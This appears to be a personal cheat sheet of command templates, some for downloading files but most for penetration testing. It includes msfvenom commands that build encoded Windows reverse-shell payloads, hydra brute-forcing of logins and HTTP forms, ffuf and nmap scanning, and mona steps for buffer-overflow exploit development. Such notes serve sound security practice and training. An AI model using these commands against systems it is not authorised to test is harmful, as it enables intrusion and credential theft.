# Command-Templates
## Just a few template commands to copy because I'm forgetful

### wget (Downloading a directory)
```
wget -r -np -nH --cut-dirs=3 -R index.html <DIRECTORY>
```

### yt-dlp (Downloading the best quality from a file)
```
yt-dlp  --merge-output-format mp4 -f "bestvideo+bestaudio[ext=m4a]/best" -a likes.txt
```

### tshark (Extracting dns records)
```
tshark -r <PACKET_FILE> -Tfields -e dns.qry.name -Y "ip.src_host==<IP_ADDRESS>" > <TXT_FILE>
```

### ffuf (Recursive directory scanning)
```
ffuf -w <WORDLIST> -u http://<IP_ADDRESS>/FUZZ -o <OUTPUT_FILE> --recursion -fc 403
```

### nmap (Basic network scanning)

- Runs nmap default scripts
- Scan service versions
- Outputs file in normal format
- Disable host discovery
- Verbose

```
nmap -sC -sV --oN <OUTPUT_FILE> -vv -Pn <IP_ADDRESS>
```

### msfvenom (Simple Windows Payload)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<LISTENING_PORT> -f exe -e x86/shikata_ga_nai -o <OUTPUT_FILE>
```

### msfvenom (Simple Windows Payload Shell)
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f py -b [bad characters]
```

### hydra (brute forcing)
```
hydra -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS>
```

### hydra (http-post-form)
```
hydra -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
```

### Immunity Debugger (Finding bad characters)
```
!mona bytearray -b "\x00"
!mona compare -f <binary file> -a <address>
```

### Immunity Debugger (Finding a jump point)
```
!mona jmp -r esp -cpb [bad characters]
```
